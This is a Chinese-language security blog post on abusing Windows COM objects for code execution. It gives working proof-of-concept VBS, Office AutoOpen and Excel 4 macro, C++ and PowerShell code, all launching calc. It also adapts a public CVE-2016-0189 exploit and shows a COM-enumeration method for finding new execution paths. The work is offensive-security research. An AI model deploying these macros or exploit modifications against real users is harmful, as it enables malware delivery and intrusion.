I"+l<h1 id="前言">前言</h1>

<p>本文在FireEye的研究<a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">Hunting COM Objects[1]</a>的基础上，讲述COM对象在IE漏洞、shellcode和Office宏中的利用方式以及如何挖掘可利用的COM对象，获取新的漏洞利用方式。<!--more--></p>

<h1 id="com对象简述">COM对象简述</h1>

<p>COM(微软组件对象模型)，是一种独立于平台的分布式系统，用于创建可交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档) 和 ActiveX (支持 Internet 的组件) 技术的基础技术。</p>

<p>注册表项：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID</code>下，包含COM对象的所有公开的信息，图中显示了Wscript.Shell对象在注册表中的信息：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/Wscript.Shell对象.png" alt="Wscript.Shell对象" /></p>

<p>其中<code class="language-plaintext highlighter-rouge">{72C24DD5-D70A-438B-8A42-98424B88AFB8}</code>就是该对象的CLSID。如果将COM对象比作人的话，CLSID就相当于身份证号，每个COM对象的CLSID都是唯一且不重复的。当然，如果只有身份证号，会有很多不方便的情况，于是便有自己的名字。COM对象中的ProgID就相当于它的名字，图中的COM对象ProgID为WScript.Shell.1：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ProgID.png" alt="ProgID" /></p>

<p>而InProcServer32表示该COM对象位于哪个PE文件中，图中表示WScript.Shell对象位于<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wshom.ocx</code>中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/InProcServer32.png" alt="InProcServer32" /></p>

<p>有了上述的信息后，接下来便可以通过这些信息去使用COM对象了。</p>

<h1 id="com对象的利用">COM对象的利用</h1>

<p>COM对象可以通过脚本语言（VBS、JS）、高级语言（C++）和powershell创建。接下来分别介绍这三种创建方式。</p>

<h2 id="脚本语言创建com对象">脚本语言创建COM对象</h2>

<p>通过脚本语言，我们可以很轻易的创建一个COM对象，使用VBS创建Wscript.Shell对象：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
</code></pre></div></div>

<p>运行效果如图：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/运行VBS.png" alt="运行VBS" /></p>

<p><code class="language-plaintext highlighter-rouge">CreateObject</code>方法使用COM对象的ProgID：Wscript.Shell来创建对象，创建完成后便能调用该对象的Run方法通过cmd起calc。除了使用ProgID，还可以使用Wscript.Shell对象的CLSID来创建：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim Shell
Set Shell = GetObject("new:72C24DD5-D70A-438B-8A42-98424B88AFB8")
Shell.Run "cmd /c calc.exe"
</code></pre></div></div>

<p>这种方法的好处是当想要创建的COM对象没有ProgID时，便可以通过CLSID进行创建。接下来对<a href="https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html">CVE-2016-0189[2]</a>的EXP进行改造，将EXP中如下vbs代码替换成创建Wscript.Shell即可。</p>

<p>替换前：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' Execute cmd
Set Object = CreateObject("Shell.Application")
Object.ShellExecute "cmd"
</code></pre></div></div>

<p>替换后：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' Execute cmd
Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
</code></pre></div></div>

<p>最终实现效果：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/改造EXP.png" alt="改造EXP" /></p>

<p>接下来讲述COM对象在Office宏中的利用，以Office2019为例，在word文档中创建如下宏代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub AutoOpen()
Dim Shell
Set Shell = CreateObject("Wscript.Shell")
Shell.Run "cmd /c calc.exe"
End Sub
</code></pre></div></div>

<p>打开文件后，会提示宏已被禁用：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/宏安全提示.png" alt="宏安全提示" /></p>

<p>点击启用宏后，使用cmd起计算器：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/word起calc.png" alt="word起calc" /></p>

<p>用法和IE中一致，就不再赘述了。</p>

<h2 id="通过高级语言创建com对象">通过高级语言创建COM对象</h2>

<p>如果想通过高级语言（这里以C++为例）使用COM对象的话，必须要明白微软定义的COM三大接口类：<a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown">IUnknown[3]</a>、<a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory">IClassFactory[4]</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch">IDispatch[5]</a>。</p>

<p>参考<a href="https://blog.csdn.net/weiwangchao_/article/details/6949264">COM三大接口:IUnknown、IClassFactory、IDispatch[6]</a>一文。COM规范规定任何组件、任何接口都必须从IUnknown继承，IUnknown内包含3个函数：QueryInterface、AddRef和Release。QueryInterface用于查询组件实现的其它接口，AddRef用于增加引用计数，Release用于减少引用计数。根据本人的理解，QueryInterface用来获取IClassFactory类的的接口，AddRef和Release用于控制装载后InProcServer32所在PE文件的生命周期。当引用计数大于0时，内存中始终存在一个PE文件可以创建COM对象，当引用计数等于0时，系统会将内存中的PE文件释放掉，也就无法对该COM对象进行任何操作了。</p>

<p>IClassFactory的作用是创建COM组件，通过类中CreateInstance函数即可创建一个可以使用的COM对象。有了对象还不够，必须要使用对象中的各种函数来执行功能，于是便要使用IDispatch接口类来获取函数和执行函数。</p>

<p>IDispatch叫做调度接口，IDispatch类中的GetIDsOfNames函数可以通过IClassFactory创建的COM对象的函数名获取对应的函数ID（IID），通过这个ID就可以使用IDispatch类中的Invoke函数来执行COM对象中方法。最后将相关的资源使用IUnknown-&gt;Release函数释放，即可完成一次完整的COM对象调用过程。图中所示就是具体的实现流程：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/image-20210630154827820.png" alt="word起calc" /></p>

<p>不过在实际使用中，并不会直接使用IUnknown接口类的函数，因为极易因为程序员的疏忽忘记释放一个接口或者多释放一个接口导致错误，因此使用图中函数CoCreateInstance就能直接创建一个类的接口。也就是说一个函数封装了IUnknown类和IClassFactory类的功能，能够简化流程。</p>

<p>下面是创建WScript.Shell对象，使用Run方法起powershell的完整代码：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _WIN32_DCOM
</span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
<span class="cp">#include</span> <span class="cpf">&lt;comdef.h&gt;</span><span class="cp">
</span>
<span class="cp">#pragma comment(lib, "stdole2.tlb")
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HRESULT</span> <span class="n">hres</span><span class="p">;</span>

    <span class="c1">// Step 1: ------------------------------------------------</span>
    <span class="c1">// 初始化COM组件. ------------------------------------------</span>

    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoInitializeEx</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">COINIT_MULTITHREADED</span><span class="p">);</span>

    <span class="c1">// Step 2: ------------------------------------------------</span>
    <span class="c1">// 初始化COM安全属性 ---------------------------------------</span>

    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoInitializeSecurity</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>
        <span class="o">-</span><span class="mi">1</span><span class="p">,</span>                          <span class="c1">// COM negotiates service</span>
        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Authentication services</span>
        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Reserved</span>
        <span class="n">RPC_C_AUTHN_LEVEL_DEFAULT</span><span class="p">,</span>   <span class="c1">// Default authentication </span>
        <span class="n">RPC_C_IMP_LEVEL_IMPERSONATE</span><span class="p">,</span> <span class="c1">// Default Impersonation</span>
        <span class="nb">NULL</span><span class="p">,</span>                        <span class="c1">// Authentication info</span>
        <span class="n">EOAC_NONE</span><span class="p">,</span>                   <span class="c1">// Additional capabilities </span>
        <span class="nb">NULL</span>                         <span class="c1">// Reserved</span>
    <span class="p">);</span>
    <span class="c1">// Step 3: ---------------------------------------</span>
    <span class="c1">// 获取COM组件的接口和方法 -------------------------</span>
    <span class="n">LPDISPATCH</span> <span class="n">lpDisp</span><span class="p">;</span>
    <span class="n">CLSID</span> <span class="n">clsidshell</span><span class="p">;</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">CLSIDFromProgID</span><span class="p">(</span><span class="s">L"WScript.Shell"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clsidshell</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">CoCreateInstance</span><span class="p">(</span><span class="n">clsidshell</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CLSCTX_INPROC_SERVER</span><span class="p">,</span> <span class="n">IID_IDispatch</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">lpDisp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="n">LPOLESTR</span> <span class="n">pFuncName</span> <span class="o">=</span> <span class="s">L"Run"</span><span class="p">;</span>
    <span class="n">DISPID</span> <span class="n">Run</span><span class="p">;</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">GetIDsOfNames</span><span class="p">(</span><span class="n">IID_NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pFuncName</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">LOCALE_SYSTEM_DEFAULT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Run</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="c1">// Step 4: ---------------------------------------</span>
    <span class="c1">// 填写COM组件参数并执行方法 -----------------------</span>
    <span class="n">VARIANTARG</span> <span class="n">V</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">V</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">vt</span> <span class="o">=</span> <span class="n">VT_BSTR</span><span class="p">;</span>
    <span class="n">V</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">bstrVal</span> <span class="o">=</span> <span class="n">_bstr_t</span><span class="p">(</span><span class="s">L"cmd /c calc.exe"</span><span class="p">);</span>
    <span class="n">DISPPARAMS</span> <span class="n">disParams</span> <span class="o">=</span> <span class="p">{</span> <span class="n">V</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">hres</span> <span class="o">=</span> <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">Invoke</span><span class="p">(</span><span class="n">Run</span><span class="p">,</span> <span class="n">IID_NULL</span><span class="p">,</span> <span class="n">LOCALE_SYSTEM_DEFAULT</span><span class="p">,</span> <span class="n">DISPATCH_METHOD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">disParams</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">FAILED</span><span class="p">(</span><span class="n">hres</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="c1">// Clean up</span>
    <span class="c1">//--------------------------</span>
    <span class="n">lpDisp</span><span class="o">-&gt;</span><span class="n">Release</span><span class="p">();</span>
    <span class="n">CoUninitialize</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>步骤一、二都是用来初始化调用COM对象，步骤三使用了CoCreateInstance创建了WScript.Shell对象的IDispatch类接口，使用GetIDsOfNames函数获得了Run函数的ID。步骤四通过函数ID使用Invoke函数执行了Run方法起calc，最终运行的效果和IE的EXP一致，这里就不再展示了。</p>

<p>那么，如此复杂的方式相比VBS有什么好处呢？那就是可以将C++代码通过shellcode生成框架转化为shellcode，生成后的shellcode比VBS能用在更多的地方，更加灵活，至于如何将代码转换成shellcode本文就不再讲述了。</p>

<h2 id="通过powershell创建com对象">通过powershell创建COM对象</h2>

<p>接下来就是最后一种创建COM对象的方式：使用powershell创建COM对象。使用powershell一样可以分别通过ProgID和CLSID创建，使用<code class="language-plaintext highlighter-rouge">$shell = [Activator]::CreateInstance([type]::GetTypeFromProgID("WScript.Shell"))</code>命令可通过ProgID创建WSH对象，而使用<code class="language-plaintext highlighter-rouge">$shell = [Activator]::CreateInstance([type]::GetTypeFromCLSID("72C24DD5-D70A-438B-8A42-98424B88AFB8"))</code>则可以通过CLSID创建，下图是通过CLSID创建后的效果：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/powershell创建COM.png" alt="powershell创建COM" /></p>

<p>通过这种创建COM对象的方式，我们便可以编写powershell脚本进行COM对象的遍历了，获取计算机中大部分COM对象的方法和属性了。</p>

<h1 id="com对象的挖掘">COM对象的挖掘</h1>

<p>这部分的内容参考了FIREEYE的研究进行，利用powershell脚本遍历COM对象的方式成功挖掘到一种利用方式，故此分享。</p>

<h2 id="已公开com对象利用挖掘">已公开COM对象利用挖掘</h2>

<p>首先需要遍历系统中所有COM对象的CLSID，于是编写powershell脚本，将CLSID输出到txt文本中：</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">New-PSDrive</span><span class="w"> </span><span class="nt">-PSProvider</span><span class="w"> </span><span class="nx">registry</span><span class="w"> </span><span class="nt">-Root</span><span class="w"> </span><span class="nx">HKEY_CLASSES_ROOT</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">HKCR</span><span class="w">
</span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">HKCR:\CLSID</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">clsids.txt</span><span class="w">
</span></code></pre></div></div>

<p>生成的clsid.txt如图所示：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid.png" alt="clsid" /></p>

<p>接着利用这些clsid通过powershell创建对应的COM对象，并且使用Get-Member方法获取对应的方法和属性，并最终输出到文本中，pwoershell脚本如下：</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Position</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="nv">$Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"clsid-members.txt"</span><span class="w">
</span><span class="bp">$input</span><span class="n">Filename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"clsids.txt"</span><span class="w">
</span><span class="kr">ForEach</span><span class="p">(</span><span class="nv">$CLSID</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="bp">$input</span><span class="nx">Filename</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
      </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"</span><span class="si">$(</span><span class="nv">$Position</span><span class="si">)</span><span class="s2"> - </span><span class="si">$(</span><span class="nv">$CLSID</span><span class="si">)</span><span class="s2">"</span><span class="w">
      </span><span class="n">Write-Output</span><span class="w"> </span><span class="s2">"------------------------"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
      </span><span class="n">Write-Output</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="nv">$CLSID</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
      </span><span class="nv">$handle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">activator</span><span class="p">]::</span><span class="n">CreateInstance</span><span class="p">([</span><span class="n">type</span><span class="p">]::</span><span class="n">GetTypeFromCLSID</span><span class="p">(</span><span class="nv">$CLSID</span><span class="p">))</span><span class="w">
      </span><span class="nv">$handle</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-Member</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-File</span><span class="w"> </span><span class="nv">$Filename</span><span class="w"> </span><span class="nt">-Append</span><span class="w">
      </span><span class="nv">$Position</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>脚本运行期间可能会打开各种软件，甚至会退出，需要截取clsid重新运行。运行后的文本内容为：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/clsid-members.png" alt="clsid-members" /></p>

<p>通过搜索关键词：execute、exec、和run，能够发现不少可以利用的COM对象。本人由于在研究宏相关的COM利用，于是尝试了关键字ExecuteExcel4Macro，结果意外的收获到了COM对象Microsoft.Office.Interop.Excel.GlobalClass：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro.png" alt="ExecuteExcel4Macro" /></p>

<p>于是使用ExecuteExcel4Macro函数加载shell32.dll中的ShellExecuteA成功起calc：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub Auto_Open()
Set execl = GetObject("new:00020812-0000-0000-C000-000000000046")
execl.ExecuteExcel4Macro ("CALL(""shell32"", ""ShellExecuteA"", ""JJJCJJH"", -1, 0, ""CALC"", 0, 0, 5)")
End Sub
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExecuteExcel4Macro-calc.png" alt="ExecuteExcel4Macro-calc" /></p>

<h2 id="未公开com对象利用挖掘">未公开COM对象利用挖掘</h2>

<p>对于已经公开的COM对象挖掘较为容易，当面对未公开的COM对象时，就需要通过逆向挖掘利用。比如位于<code class="language-plaintext highlighter-rouge">C:\windows\system32\wat\watweb.dll</code>中的WatWeb.WatWebObject对象公开了一个名为LaunchSystemApplication的方法，在oleview中能看到需要3个参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/oleview.png" alt="oleview" /></p>

<p>但仅凭这些信息无法确定该方法是否能起任意进程，于是逆向查看LaunchSystemApplication，由于有调试符号，因此可以直接定位到该方法：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplication.png" alt="LaunchSystemApplication" /></p>

<p>LaunchSystemApplication调用LaunchSystemApplicationInternal，进入查看发现调用了CreateProcess，有利用的可能：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/LaunchSystemApplicationInternal.png" alt="LaunchSystemApplicationInternal" /></p>

<p>但是可以看到调用了IsApprovedApplication方法进行校验，进入查看：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/IsApprovedApplication.png" alt="IsApprovedApplication" /></p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/COM%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8C%96%E6%8E%98/ExeName.png" alt="ExeName" /></p>

<p>发现需要校验传入的字符串为slui.exe，同时会将该字符串附加到系统路径下，因此并不能随意执行进程。尽管最终没有利用成功，但是这种思路可以帮助分析其他未知的COM对象，挖掘到更多的利用方式。</p>

<h1 id="结论">结论</h1>

<p>COM对象功能强大，灵活便捷，可以用于浏览器、脚本、Office宏、shellcode和powershell。通过powershell遍历系统中的COM对象，结合逆向分析更有可能发现未公开的利用方式。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html">FireEye-Hunting COM Objects</a></p>

<p>[2] <a href="https://github.com/theori-io/cve-2016-0189/blob/master/exploit/vbscript_godmode.html">Github-Brian Pak-CVE-2016-0189-exploit</a></p>

<p>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iunknown">Microsoft-IUnknown接口说明文档</a></p>

<p>[4] <a href="https://docs.microsoft.com/en-us/windows/win32/api/unknwnbase/nn-unknwnbase-iclassfactory">Microsoft-IClassFactory接口说明文档</a></p>

<p>[5] <a href="https://docs.microsoft.com/en-us/windows/win32/api/oaidl/nn-oaidl-idispatch">Microsoft-IDispatch接口说明文档</a></p>

<p>[6] <a href="https://blog.csdn.net/weiwangchao_/article/details/6949264">CSDN-COM三大接口:IUnknown、IClassFactory、IDispatch</a></p>
:ET